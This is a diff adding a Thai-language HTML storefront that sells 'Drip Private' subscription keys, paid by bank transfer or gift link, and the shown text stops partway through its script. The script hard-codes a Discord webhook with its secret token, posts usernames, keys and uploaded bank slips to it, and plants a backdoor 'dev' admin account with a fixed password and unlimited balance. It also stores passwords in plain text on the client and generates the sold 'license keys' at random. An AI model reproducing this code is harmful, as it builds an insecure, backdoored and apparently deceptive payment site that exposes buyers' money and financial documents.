@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MARK SHOP - DRIP EXCLUSIVE</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Kanit', sans-serif; background-color: #020202; color: white; overflow-x: hidden; }
+        .glass { background: rgba(5, 5, 5, 0.9); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.03); }
+        
+        .btn-glow { transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1); cursor: pointer; position: relative; }
+        .btn-glow:hover { transform: translateY(-3px); filter: brightness(1.3); box-shadow: 0 0 20px rgba(59, 130, 246, 0.4); }
+        
+        .card-drip { 
+            transition: all 0.5s ease; 
+            border: 1px solid rgba(255,255,255,0.03); 
+            background: linear-gradient(145deg, #0a0a0a, #050505); 
+            border-radius: 2.5rem; 
+        }
+        .card-drip:hover { 
+            transform: translateY(-10px); 
+            border-color: #3b82f6; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6), 0 0 15px rgba(59, 130, 246, 0.1);
+        }
+
+        .fade-in { animation: fadeIn 0.6s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .banner-img {
+            width: 100%;
+            height: 450px;
+            object-fit: cover;
+            border-radius: 3.5rem;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
+        }
+
+        .drip-text {
+            background: linear-gradient(to bottom, #fff, #3b82f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+    </style>
+</head>
+<body class="antialiased">
+
+    <nav class="glass sticky top-0 z-[100]">
+        <div class="max-w-[1400px] mx-auto px-8 h-20 flex items-center justify-between">
+            <div class="flex items-center gap-12">
+                <div onclick="showPage('home')" class="text-3xl font-black text-blue-500 cursor-pointer uppercase tracking-tighter italic">MARK<span class="text-white">SHOP</span></div>
+                <div class="hidden lg:flex gap-10 text-[11px] font-bold uppercase tracking-[0.4em] text-zinc-500">
+                    <button onclick="showPage('home')" class="hover:text-blue-500 transition">Home</button>
+                    <button onclick="showPage('store')" class="hover:text-blue-500 transition">Drip Store</button>
+                    <button onclick="showPage('history')" class="hover:text-blue-500 transition">My Inventory</button>
+                </div>
+            </div>
+            <div id="navAuthArea">
+                <button onclick="openAuthModal('login')" class="bg-blue-600 px-8 py-2.5 rounded-2xl text-xs font-black btn-glow uppercase">Sign In</button>
+            </div>
+        </div>
+    </nav>
+
+    <main id="homePage" class="max-w-[1300px] mx-auto px-8 py-12 fade-in">
+        <div class="relative mb-16">
+            <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxAPDw8PDxAPDg8NDw0PDw8NDQ8PDw8QFREWFxYRFRUYHSghGBolHRUVITEhJSkrLi4uFx8zODMwNygtLisBCgoKDg0OGhAQFy0gICUtKystLSsvLS0tKy0tLS0rLS8tLS0tLS0tLSstLS0tLSstLS0tLS0rLS0tLS0tKy0uLf/AABEIANQA7gMBEQACEQEDEQH/xAAbAAACAgMBAAAAAAAAAAAAAAAAAQIEAwUGB//EAEgQAAEDAgIGBQgEDQIHAAAAAAEAAgMEEQUSBhMhMUGBByJRYXEUMnKRobGywUJSc9EVIyQzNDVDU2KCksLwJYQWJkSTorO0/8QAGgEBAAMBAQEAAAAAAAAAAAAAAAECAwQFBv/EADcRAQACAgADBQQIBgIDAAAAAAABAgMRBBIxBRMhQVEyYXGRFCI0gaGxwdEVM0JS4fAjgjVDsv/aAAwDAQACEQMRAD8A8fClU7IGgkpQYCCQCIMBEHZAwEQlZAAKUHZAWRB2QOyAsgLICyAsgLIDKgVkCsiSshssqJ2iQoTCJCJRKBFEoqEkEDCCQRBhSJAIhIBEJAKUHZEGAgllRB5UDDUDyIjYyKTZ5UNpBiI2NWmjZZENmGJo2lq1OkbIxqNG0SxNJ2WRDZ6tNGxqk0cyDokTEsLmqF4ljIULIFEkVCUQgYQSClCQCIZGtUollbGim2QRKdI2erTRtJsSaRMp6sdylXYMSHMYjTRzLEVDI7zY5HejG4+4KeWWc5ax1mCmpHMNnscwncHtc0nkUmNdU1yVt0nbFq1C3M3lFojWyta9kBLJGhzXGSIAtIuDtddaxhvPjpw5O0eHpM1tfxj3T+y83QOuI8yMdxmbc+pW7i7H+LcP6z8mhr8NkgeY5mGN7d7XW3doI2Ed4WVqzE6l3Y81cleak7g8Ow2SokbFE3O9+4bgBxcTwA7VNazM6gy5q4qTe86h31B0dwhoNRNI9/EQ5WMHdtBJ8dngumvDx5y8HL2zeZ/46xEe/wAZVca6PQGF9I9znAX1U2W7u5rgBY9x9YUX4f8AtacP2xM25csa98fs4OSEi4IIIuCCLEEcCOC5Zh7sW27HSTRimp6Bs8bX60+T9Z0rnDrWzbNy6cmKtabh4/B8fmy8T3dpjXj5eilobT0LmzmtMILXR6vXS5NlnZrC4vwVcMY/Hnb9o34mJr3G/PeodIH4IzhRHwYJPkV0bwR6PM12lb+756Oq0aw+uiLqbVMO4S01gGu7HsGzlsKThx5I3VFOP4rhr6y7n3W/Sf8AYeYYrQPp5XwyCz43WIG0HiCDxBBBHiuC9ZrOpfT4c1ctIvXpLWuCzdMMZRKKhZEIJBBIKUJtCKytQx3sACSbAAC5J7AOKtDOZ09EwPo4L2B9XI6IuAOqiDS9vc5xuL9wHNdVOH8PrS8Hie2YrblxV375/SG4GgWHs8+SU+nOxvuAV+4o5P4rxNulY+TQ6c6N09GyAwNcDI94cXyOfcBoI37lnlxxWI07uzuMy57Wi89FbQvRgVj3SS3FPEQHWNjI/fkB4C20nvHKMWLm8Z6NO0OOnBXlr7U/g7D/AIgwumOoYGBrTldqYC6MeJA63K637zHXweT9D4zLHPP4z4tdpbozBNTmsowwFrdY4RW1cse8uAGwOA27N9iqZccTHNVvwPG5KZO5zfDx6xLktFsSjo6kTyNc5oZI20YaXEutbeQFhjtFbbl6vGYLZ8XJWdTuHZHpEg+jBOfSMbfcSuj6RHo8iOxsnnePxbDDsapMUa+nkjIdlJ1UtjcfWY4cRyIV63rk8HPl4XNwcxkrbw9Y/V55pDhBpKh8JN2izo3He5h3X7945LlvTlnT3+F4jv8AFF/n8W3otNamKKOFjIMsTGRgua8khotc9buWkZrRGnJk7MxXvN5mfGd+TO3TesuCRCQNpaIyAR2XvcJ39lJ7Lwa14/NutP4GS0cU9rPa+PLfzsrxtafYeS0zRuu3H2Xe1M04/Lx/AtAKNkNLJVOG2Qv63ZFHfZ6w4+rsTDERXZ2pktkzRijy185cbjOMzVcjnvc4NJ6kYccjG8Bbie9YWvNpexw/DUw15ax9/q32gWMSCcUz3OfHK1xYHEksc0X2HsIB2eC1w3nfK4O1OGp3fexGpjr71HpAo2x1jnNFhNEyUgfWu5pPPKDzVM8as37KyTfBET5Tr9XRabD/AEtn+1+S2zfy3m9nfbJ/7PLnlcT6iCaUJdJoLVPZXRNaTlnD2SDgQGOcDyI9634e0xeHm9p4624eZnrGpj56ZelCNoqYnDe+Drcnut7/AGKeLj60fBTsS0zhtHpP6OEkXI92GIqFkUSiFCTCISClDLGisu36MsPbNWh7hcU0bpQD+8uGtPK5PiAunh67s8ftfNNMGo8519w0wxuSpqZWZnCGGR8TIwSGnIcpc4cSSDv3CyZbzaxwHC0xYonXjMbmfi0kAGZuwec3gO1Zw7bTOpeh9J35ul9OX4QurP0h4HZHtX+5GGU0+Al8fVdICC4bD+MnyE+Njbkm9YvBNo7ztDVvL9I28+Dlyvd09I6OpC+inY7a1ssgAO4B0bSR6yTzXXg9mXz3asRGesx6R+bzTgPALkfR+ZsREug0MY419Plv1XPc63BgY65PdttzC1xe3Dg7QmI4e2/98Wy6SpAaqMDe2Bubm91lbP7Tn7Iie5mff+zaYRoXSyQQyvfNeWKORwD2NaC5oJA6u7atK4azES5s/aeauS1KxHhMx/vi2lLojRNIcGukym9nylzb94Gw+CtGKrlv2jxExrevuaHpDxNxkbS5S1keWUk/tCQQC3+EbR437Fnmt46d/ZWCIrOXfjPh8G10HmZPQugJ2xmWN445ZLuB/wDiljkVfDO6acnaVZx8RGT11PycPieCz00hjfG82NmvYxzmPHAgj3b1z2pNZ09vDxWPLXmi0fD0dRoLo/IyTyqZpjytLYmPFnkuFi8jeBa429q2w45ieaXl9p8ZS1e6pO/X9nP6bYk2erkLDdkTRC0jc7LcuI/mJHJZZbbs7+zsE4sMRbrHi6nTU/wCls/2nyW+b+W8rs37ZP/Z57QYRUVObUROlDCA4hzABe9vOI7CuStLW6Q+hy8Tiw67y2tthFoZXn9iG+lNF8nLT6Pk9HNPanDR/X+Eus0Y0bFCH1FQ9msDHbQfxcLPpEuO89/BdOLFyfWs8njeOnidYsUTr8ZlwWlmL+V1L5W31YAjiuLHI2+0jhcknmuPNk57be/wHDdxhik9es/FzzysXfDEVCxIlAKEpBEJBSMrCikuz6NsTbBWhryGtqGGG52APuCz1kW8XBdGC2rPI7WwTkwbr1jx+7zbXSnQ6pFRJLTx66KZ7pLMLQ+NzjdzSCRsuTYjtWmTDbe4c3B9o4pxxXJOpjw+OnPVmFz0zo9fE6LWG7MxYb5SL7ie0LKazXq9DHnx5onu7b07bpQdaOl9OX4QujiOkPG7G8bX+EMNY7/l1p+y/+oKJ/k/76rY//JT9/wD8vPM65Hv6eldGLvySp+2P/qauzh/Zl852xH/NT4frLjtGMLFZO2AvMYMbn5g0OPVA2W5rDHXntp7HGcRPD45vEb8XaR9HcA3zzH0Wxj5Fb/R49XjT2zknpSPxXQKHB43EG8rxuLg6eW25oH0RyAV/qY4Y74njrRHl+EPM8VxJ9RNJNJ50jr2G5o3Bo7gLBcdrTady+kw4a4qRSvSFPWX37fFV2102eB4s+lmZJGcoDm6xo817L7QRx2epXpflnbm4nh65sc1tHw+Pk6PT/FqWobA6CVsr43Pa7KHeY4A7yO1o9a2zXrOtS87svh82KbRkrqJ/NzeDY1LSSiWI7dzmu817fquHz4LGt5rO4ejxHDUz05Lx/h3VP0h0xb+MjmY7iGhj28jce5dMcRXzeHfsbNE/VtEx8mk0h07fMx0VO10LHCzpHEa0jsFtjfG5Pgs8mfcah28J2TXHPNknmn08v8uMdJw3cFzzL2Yh0eN6X+U0rabU5Mup65lzeZ3ZePitr5+avLp5vDdm9zm73m318Neqpo7pO+hEoZGyTWlhJe5wtlB7PFRizTTem3F8BXiZibWmNenvbJ/SHU8IqceLZHf3K/0u/pDljsXD52n8P2aLGtJKmrGWaTqXB1cYyR3G4kceZKxvmtfrLv4fgcODxpXx9Z8Z/wB+DRSPWTuiGElQsgUWRKhKIQSCBhShNpREwsRvUs5h2OFdIFZAwRu1dQGgBpmDtYB2FwO3nc9668RaPB5OfsjBktzRuvw6fJR0h0nlrnROkZGzU58ojDtuYtJvcn6oVb5Zv1bcLwNOHiYrMzssd0oqK0ME+qAiLi3VMc3aQAb3cexL5Jv1Tw3A4uHmZpvx9VeXSCodTCjLx5OMvUyMvsfmHWtff3qs5LcvL5L14PFGXvoj63+w1mdU26dLlHi08LSyKaWJrjdzY5HNBNrXNu4K0XmOkscnD48k7tWJn3scFU6M3Y90Zta8b3MNuy4SJ0vakWjVo38WR1fI7zpZHelI8+8pzT6qxipHSsfJhdL7VC+mJz0WiEc6g0kJFOzQMig0WsTZo9am0cqJkTadIF6LeLOoNFnROiMiGkC9E6YyVCyJKJRRKJUJRCCSBhShIFEJtciGQPUo0lnRGhnQ0eZEDMgYcgeZDTNqJNXrsjtUH6oyW6oktfLftsR61Xnrzcm/HW9e5Xw6MOZWToXRJXQF0F2Kgc6nkqHOaxjHtjYHA3mktctb6IIJPeBx2ZWzRGSMetzPj8I9/xVmfHSldarFmQBKCN0SLoI3RKJKhJXQRJRKJKJIqEkgiEDCBhBIFShIFEGCgd0QldEC6B3QO6lB3QbnRvEo43Pp6g/klWAyW52RO+jMOyx3ns8FycXhtaIyY/ar4x7484Z3rPWOrMdEK4zPijp5JAx1hLsZE5u8OD3EA7LbrqkdpcNyRe14jfl1n5Qd5XW9tjF0dVx891NH3GV7j7G29q557Z4f+mLT8v3R3sFP0fVbRskp3HszyN/tU17Xwz1rP4fujvYa1+idYJGRujDQ9waZQ9ro2Di91jewFyuj+I4OWbRPTy85X56quO1rHvbDDdtPSgxQtO82N3SO/icSSe8rThscxWb39q3jP7fCCkf1T1awldK5XQF0SV1ARKBXRKJKJIlArolFQEiSQRRJhEJIGgYKlB3RBgoHdA7og7oHdELeGYfLVSsggYZJJNwGwAcXOPBo4lZ5s9MNJvknUR/uo9ZVmdeMvXNEtBqSnaJZCysnadrzZ0MbhwY3ds7Tt8F8tx/aXEZJ5dTSs9I6TMeu/T4eHxck54vvln5OslcvKqpr1VJHrapyxHi1lTWNBLQHPI35QLDuuTv7l6vC9ncRnrzUp4evRzZuLw4Z1e2p+arVm3MD1EXHsKzmkxM1tGpjwmPg6cd4tWJidxPm5jGsJhn2luV/B7QA7n2ruwZ74+k+Ho6a2cNiVA+nflftB81w3OXsYc1csbhtE7U7rVYXQK6BXRJXQIlAkSRUJJAigSJJQBSGEQaBoGEQakO6B3RAugYPPuAuSiHt2iWinklCW7G1dU1rp3m92jfqQeAAuO83K+SzdpY8vGVvkjeOs+Eevv17/y8HncXF8lLRSdTrwdDQUwgjyXuSSXEbr93dsCw7U4+eO4jvNaiI1Ee7/P+HNwfDfR8fJvc9Z+KM0q46w7IUpZlvWpprXhoJNzvJt4m6+l4ftrJjwRjikbiNRO/0/y8nL2TXLmnJN51Pjr/ACpVdRf/ADcALALzdze02tO5mdz8ZevjpFKxWseENTPNtW8Q1iNKdfTtnjLHcdx4tPAhaY7TS3NC0eDg54ixzmO3tJBXs0tFqxaGzHdWSLoFdArokXUBXRJFAkCRJKAkDQCkO6IO6BhAXQNEGpBdBvNCKMT4jSMcLtbJrXA8RGC4e0NXD2llnHwt5j018/D8ts8k6rL3mSotvPr2L4iKuPTA3FYozdzoz3Oe0Lopjt6JjwlqazGYSSdbEL8Naz71vXBf+2fknTWzYzB++i/7jfvXRXBf+2VtKE+Mw/vo/wCtq6K4L+kp5WuqMViO6Rn9bV0Vw29FohT8sYfps/qC25JjyWTE47R6wq8o5nSZlpg4fTYCfEG33L0OFn6sw1p0ai66liugLqEkgLoEgSJJAIBQEgEDQCkCB3RBoC6B3QWIaKZ7M7IZns+uyGRzP6gLKlsuOtuW1oifTcbRuFvR2mqZalkdI7JO4Ps4v1eVoHWu7eFjxeTFTFzZo3Xw9/j5K31y+LshoHXv2zVdODxt5RMfWcq8j+K8NX2Mc/hH7sOanlCJ6OHfSrG/y0p+cin+M18sf4/4OePKEHdHrBvqpD4QNH9xVv4vb+yPmc/uYn6CxD/qJT/JGFeO1Lz/ER+Keb3K0mh8Q/bS/0x/ctI7RvP9MfinmVZdGY2/tZObWLWONtPlH4p2rnR9vCU84wfmtPpU+iUTo861xK3nGR/co+mV3yzBuGsr6V8TmtcQ/N5mUuPG1rHjddOPJW0TMRppGnS0nR7UuiEsssUBcLiMtdI4D+IiwB8Lrzbds4eblpWbe/opOWPJzeKYbLTPySAG98r2EljvA/Ir0cOauWu6tImJUrrZIugSJCBIBQBAkCRIQNEBA0ApAgd0Q3ehWGMq6+CGUXi68kjfrNY0uy+BNge4lcXaGe2Dh7Xr18Ij7/P7lck8tdvXcaqgG5GANa0ANAGVrRbcANwXymCk+1PVye9yWjUDfwpFL9J0dS11hbNdmwnv2L0uLyTPBzWfWv5rzb6mnoDivFhkrSlaVSpzFbVWhQnK6Kpa+croqtDWVJXTRaFVbJOZ9mLn/8AYr5tbR2dX0lxe2Y2PaL2XXxG68NfXuaW9mXomJ1JyACws0DZ4LwOHpDCrz3Sd2aFxO9sjCO43t7ivoeEjV416N6dXJr0moUAQCAQJEhAIIoGgEAgaIF0AgaDqujL9ZM+wqfhXmdsfZZ+MM83svQ8ZXgYekubyaHRr9Pi7mzfAV0cV9mt8a/mT7Mu7eV5UKq8q0hKlMtqpUZyuiqzXTldFVoa2pK6aLKl1qIVR6nJYx/MR5tfhp/L6b+f5rr4r7Pf7ml/Zl6DiZ6nIe5eFw7CrgdIvzD/A2fEvf4b24b06uWXoNAiSQCAQCBIBAkAgaAQCAugEDQdV0ZfrJn2NR8K8vtj7LPxhlm9l6DxK8DD0c3k0OjP6fF6E/wLp4v7Nb41/NM+y7t68mFVeVa1SpTLaqVCdb1T1866KrNbUldVFlRapY6rzOSxj+YrHVr8M/Tqb+f5rr4v7Pf7mlvZl6FifmcgvB4dhVwOkX5h/ps+Jf/ABw3tw3p1csvRahAkAgEAgEAgSAQCAQCAQQNAIOq6Mf1kz7Go+FeX2x9ln4wyzey9DxnivBw9HN5NFoz+nxehP8C6OL+zT8a/mmfZ+Tu3ryVVaVaVSpzLeqVCdb1TDXTrpqs1tSumi0Kq1Sx1XmLGv8xEdWvwv9Pp/B/wA118X9nv8Ac0v7MvQcU8zkF4PD9XPVwOkX5h/ps+JfQcN7cN6dXLL0GoQCAQCAQCAQJAIBAIBAIBAIOo6NpA3EWFxsNTUDnkXmdrxM8LOvWGWb2XoGM1LL2vtK8HDWdOaJhptGXD8IRfZz/Ct+Lifo1vjX80z0+TvHryVVeVaVSpTLeqVCZb1Wa+ddFVoa2pXVRKoStUsNU7qrKsf8iI6qFBIG11OTsHX+a6+JibcPeI9y9vZl3GMYixre3qjce5eLw2K23PEuExyqa6FwFwS9luRuvc4asxd0Y53Lnl3tQgEAgEAgEAgSAQCAQCAQCAQZqSodFIyRhs+M3afYR4EEjmqXpF6zW3SUTG41Lc1GkTpLF1wRwG32rjrwUV8IYdzMdG00BrXS4pGTu1M4A5BcvaeGuPhJiPWC9OWr1h6+YhgryrSqVKZb1SozLeqzXTrpqs1tSumiVQrVKvPHc79m+ytWI3s00OM3a9hBsQLgjeDdd2HUxMS1qjJi8jwA7bbs4qteFrXopOJTnmL9+4bgt60ivRetYqxKywQCAQCAQCBhBFAIBAIBAIBAIBAIOp6NjbEoydg1U3uC8vtj7LPxhlm9l6++Zv1gvlIiXJuGBzs2658AVpWJTuFGeZo3n3resSncNfPUM+sPat6xKdw189Qz6w9q6KxK24aypqGfWHtXVSJW3CqZm9oWultwg6VvaFMG4aHHyC9ljfqnd4rt4fpLSjVroXCAQCAQCAQCAQCBIBAIBAIBAIBAIBBaw2ufTytmjNnMvv3EEWIKzzYq5aTS3RW1YtGpb86aTHgvP/hWNh9HZ6XSmpkvlOW1r8+arbgMdUTh0hPjdSd5vyH3q0cJT0O7a+fHJQbE79uyy2rwlJjwWjExR4m97st3bfBWnh4rG0zj0zOz959X3qsVRyME0z2C5Gzkr1xxMkU2r/hE9h9iv3K3dK08xebnhsC2rWKxqGla6hiVlggEAgEAgEAgYQCCKAQCAQCAQCAQCAQCBoOw0GwltRDVOO9j4gObXFeT2jxM4slIjziWOW2pgYlh5iNu9XxZovUiduZxAdYej8yu/F7LSvQsOF5W+KjNOqlujo9V3Lk5lFHGI7Qk/wATPetcM7stXq0K61wgEAgEAgEAgEAgEDQZtQtNOPvRqE0d7I1CaO9kahNHejUJo70ahNHejUJo709QmjvS1CaO9keTpyneyPJ00d7I8nTlO9l3XR1ERDVNG90sWy+/qFfPdtx/y4/hP5q3vvTDpCesLnc4bz3qvC9F6y5Kriu48+Pevc4ePqJteYXNHKPPUsb3PI2/wrLj55ME2+H5q95MuhxHDzGLG42A2v28V5GLNNkxZz+ItJYQSTtHHvXp8NH10zfUNZqF6HKr3sjUJyneyNQnKd7I1Ccp3sjUJo72RqE5TvZGoTlO9kahOU72RqE0d7I1CaO9kahNHeyNSmjvZW8qu5xlQGVA8qBWQFkBZAWQFggLBElsQFwh4ruF4m6nc4sOx4AcL9m4+O0+tcvFcLXiKxE9Y6JhjrsQMpuSPWufHwk0bRaIVc7e0etehSsVjUMrbmd6ZaWq1T2yMcA5puNvrCrlx1y0mluko1K9X44Ze7Z2j1LzcfATjn1a101rpwd7h6wu/DiinjPVW+56Qjnb2j1rfcKcsjO3tCg5ZGdvaEOWRnb2qTlkZ29qHLIzt7UNSM7e1QakZ2oakZ2oakZ2/4CpNSecf4CiNSMw/44wHUnMjMP8BTwNSyKVQgEAgEAgECQCAQCAQZYIs1+wKtraRMpPiA4BREm2FzbK6TYy5AHFRPgMzoAFSLbRuWJ7LK8SmEFIEBZAIBAIBAIBAIBAIFdAXQF0BdAXQF0BdAXRIugLoC6AuguUJ2O8QssnWFZExSoqyHatISyUh648Cq36ErUhWdUKsx2LSEsN1dIugLoC6AugLoEgd0CQCAQCBIBAIBAIBAIBAIBAIBAIIIBBbotzvEe5Y5OqJExU1FZ60hLJSeePAqt+iFqQrOoqSblrCWJWDQJAIGgEAgSgCkCgCAQf/9k=" class="banner-img" alt="Banner">
+            <div class="absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent rounded-[3.5rem]"></div>
+            <div class="absolute bottom-10 left-12">
+                <h1 class="text-5xl font-black italic drip-text uppercase tracking-tighter">DRIP SERIES</h1>
+                <p class="text-zinc-400 font-bold uppercase text-[10px] tracking-[0.5em] mt-4">Exclusive Software • Private Access</p>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-8 max-w-4xl mx-auto">
+            <div onclick="showPage('bank')" class="card-drip p-10 cursor-pointer group hover:border-[#00a950]">
+                <div class="text-4xl mb-6 group-hover:scale-110 transition">🏦</div>
+                <h3 class="text-xl font-black text-[#00a950] mb-2 uppercase italic">K-BANK TRANSFER</h3>
+                <p class="text-zinc-500 text-xs">โอนเงินเข้าบัญชี 193-3-49405-1 (นาย มาร์ค)</p>
+            </div>
+            <div onclick="showPage('topup')" class="card-drip p-10 cursor-pointer group hover:border-orange-500">
+                <div class="text-4xl mb-6 group-hover:scale-110 transition">🎁</div>
+                <h3 class="text-xl font-black text-orange-500 mb-2 uppercase italic">TRUE GIFT LINK</h3>
+                <p class="text-zinc-500 text-xs">เติมเงินอัตโนมัติผ่านซองของขวัญ</p>
+            </div>
+        </div>
+    </main>
+
+    <main id="storePage" class="hidden max-w-[1400px] mx-auto px-8 py-20 fade-in">
+        <div class="mb-12 border-l-4 border-blue-600 pl-8">
+            <h2 class="text-4xl font-black italic uppercase tracking-tighter drip-text">DRIP STORE</h2>
+            <p class="text-zinc-500 text-[10px] font-bold uppercase tracking-[0.4em] mt-2">Premium Software Subscription</p>
+        </div>
+
+        <div id="productGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-5 gap-8">
+            </div>
+    </main>
+
+    <main id="bankPage" class="hidden max-w-[700px] mx-auto px-8 py-20 fade-in">
+        <div class="card-drip p-12 text-center shadow-2xl">
+            <h2 class="text-2xl font-black text-[#00a950] uppercase mb-8">K-BANK แจ้งโอน</h2>
+            <div class="bg-zinc-900/50 p-6 rounded-3xl mb-10 border border-zinc-800">
+                <p class="text-4xl font-black tracking-widest mb-2">193-3-49405-1</p>
+                <p class="text-xs text-zinc-500 font-bold">นาย มาร์ค สั่งลุย</p>
+            </div>
+            <input type="number" id="bankAmount" placeholder="ยอดเงินโอน" class="w-full bg-zinc-900 border border-zinc-800 rounded-2xl px-6 py-4 mb-6 text-white font-bold">
+            <input type="file" id="slipInput" accept="image/*" class="w-full text-xs text-zinc-500 mb-8">
+            <button onclick="handleBankTopup()" class="w-full bg-[#00a950] py-5 rounded-2xl font-black btn-glow uppercase text-sm">ส่งสลิปแจ้งเติมเงิน</button>
+        </div>
+    </main>
+
+    <main id="topupPage" class="hidden max-w-[700px] mx-auto px-8 py-20 fade-in">
+        <div class="card-drip p-16 text-center shadow-2xl">
+            <h2 class="text-2xl font-black text-orange-500 uppercase mb-10 italic">เติมเงินผ่านซองของขวัญ</h2>
+            <input type="text" id="giftLink" placeholder="วางลิงก์ซองของขวัญที่นี่..." class="w-full bg-zinc-900 border border-zinc-800 rounded-2xl px-6 py-5 text-white mb-8 text-center font-bold">
+            <button onclick="handleCapture()" class="w-full bg-orange-600 py-5 rounded-2xl font-black btn-glow uppercase text-sm">ยืนยันการเติมเงิน</button>
+        </div>
+    </main>
+
+    <main id="historyPage" class="hidden max-w-[1100px] mx-auto px-8 py-20 fade-in">
+        <h1 class="text-3xl font-black mb-10 uppercase italic">My <span class="text-blue-500">Inventory</span></h1>
+        <div id="inventoryList" class="grid gap-4"></div>
+    </main>
+
+    <div id="authModal" class="hidden fixed inset-0 z-[200] flex items-center justify-center bg-black/98 backdrop-blur-2xl p-6">
+        <div class="card-drip w-full max-w-md p-12 relative fade-in">
+            <button onclick="closeAuthModal()" class="absolute top-8 right-8 text-zinc-500 hover:text-white text-2xl">&times;</button>
+            <div id="loginForm">
+                <h2 class="text-3xl font-black text-center mb-8 uppercase italic drip-text">Sign In</h2>
+                <form onsubmit="handleLogin(event)" class="space-y-4">
+                    <input type="text" id="loginUser" placeholder="Username" required class="w-full bg-zinc-900 border border-zinc-800 rounded-2xl px-6 py-4 text-white">
+                    <input type="password" id="loginPass" placeholder="Password" required class="w-full bg-zinc-900 border border-zinc-800 rounded-2xl px-6 py-4 text-white">
+                    <button type="submit" class="w-full bg-blue-600 py-4 rounded-2xl font-black btn-glow uppercase mt-4">Login</button>
+                </form>
+                <button onclick="toggleAuth('register')" class="w-full mt-6 text-[10px] text-zinc-500 uppercase font-bold tracking-widest hover:text-white">Create Account</button>
+            </div>
+            <div id="registerForm" class="hidden">
+                <h2 class="text-3xl font-black text-center mb-8 uppercase italic text-green-500">Register</h2>
+                <form onsubmit="handleRegister(event)" class="space-y-4">
+                    <input type="text" id="regUser" placeholder="Username" required class="w-full bg-zinc-900 border border-zinc-800 rounded-2xl px-6 py-4 text-white">
+                    <input type="password" id="regPass" placeholder="Password" required class="w-full bg-zinc-900 border border-zinc-800 rounded-2xl px-6 py-4 text-white">
+                    <button type="submit" class="w-full bg-green-600 py-4 rounded-2xl font-black btn-glow uppercase mt-4">Register</button>
+                </form>
+                <button onclick="toggleAuth('login')" class="w-full mt-6 text-[10px] text-zinc-500 uppercase font-bold tracking-widest hover:text-white">Already Have Account?</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1494992518276845650/G2SGaJKi2DHAE4tm-8Rigt8_4yU5KwDbjjK0VlivCZ0ZGhS1kQ_u16jgkSybykHbi8Y5";
+        
+        // --- 💧 DRIP PRODUCTS DATABASE ---
+        const products = [
+            { id: 1, name: 'Drip Private - 1 Day', price: 50, icon: '💧' },
+            { id: 2, name: 'Drip Private - 3 Days', price: 100, icon: '💧' },
+            { id: 3, name: 'Drip Private - 7 Days', price: 200, icon: '💧' },
+            { id: 4, name: 'Drip Private - 15 Days', price: 300, icon: '💧' },
+            { id: 5, name: 'Drip Private - 30 Days', price: 500, icon: '💧' }
+        ];
+
+        let usersDB = JSON.parse(localStorage.getItem('usersDB')) || {};
+        usersDB["dev"] = { password: "9M", balance: 999999, history: usersDB["dev"]?.history || [], isAdmin: true };
+        localStorage.setItem('usersDB', JSON.stringify(usersDB));
+        let currentUser = localStorage.getItem('activeUser') || null;
+
+        function initStore() {
+            const grid = document.getElementById('productGrid');
+            grid.innerHTML = '';
+            products.forEach(p => {
+                grid.innerHTML += `
+                    <div class="card-drip p-8 flex flex-col group fade-in">
+                        <div class="bg-zinc-900/50 rounded-3xl aspect-square mb-8 flex items-center justify-center text-5xl group-hover:scale-110 transition duration-700">
+                            ${p.icon}
+                        </div>
+                        <h3 class="text-xs font-black uppercase mb-6 tracking-tighter">${p.name}</h3>
+                        <div class="mt-auto flex justify-between items-center bg-black/40 p-3 rounded-2xl border border-zinc-800">
+                            <span class="text-blue-500 font-black text-sm ml-2">฿${p.price}</span>
+                            <button onclick="buyProduct(${p.id})" class="bg-blue-600 px-5 py-2 rounded-xl text-[9px] font-black btn-glow uppercase">Purchase</button>
+                        </div>
+                    </div>`;
+            });
+            updateNavbar();
+        }
+
+        function buyProduct(pid) {
+            if(!currentUser) return openAuthModal();
+            const product = products.find(p => p.id === pid);
+            let user = usersDB[currentUser];
+
+            if(!user.isAdmin && user.balance < product.price) return alert("ยอดเงินของคุณไม่เพียงพอ!");
+
+            if(!user.isAdmin) user.balance -= product.price;
+            const key = "DRIP-" + Math.random().toString(36).substr(2, 9).toUpperCase();
+            user.history.unshift({ name: product.name, key, date: new Date().toLocaleString('th-TH') });
+            localStorage.setItem('usersDB', JSON.stringify(usersDB));
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🛒 NEW DRIP PURCHASE!",
+                        color: 3447003,
+                        fields: [
+                            { name: "User", value: currentUser, inline: true },
+                            { name: "Plan", value: product.name, inline: true },
+                            { name: "License Key", value: `\`${key}\`` }
+                        ]
+                    }]
+                })
+            });
+
+            alert(`สั่งซื้อสำเร็จ! Key ของคุณคือ: ${key}`);
+            updateNavbar();
+        }
+
+        async function handleBankTopup() {
+            if(!currentUser) return openAuthModal();
+            const amount = document.getElementById('bankAmount').value;
+            const slip = document.getElementById('slipInput').files[0];
+            if(!amount || !slip) return alert("กรุณาใส่จำนวนเงินและแนบสลิป!");
+
+            const formData = new FormData();
+            formData.append("payload_json", JSON.stringify({
+                embeds: [{
+                    title: "🏦 K-BANK TOPUP (193-3-49405-1)",
+                    color: 43520,
+                    fields: [{name:"User", value:currentUser}, {name:"Amount", value:amount}]
+                }]
+            }));
+            formData.append("file", slip);
+            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
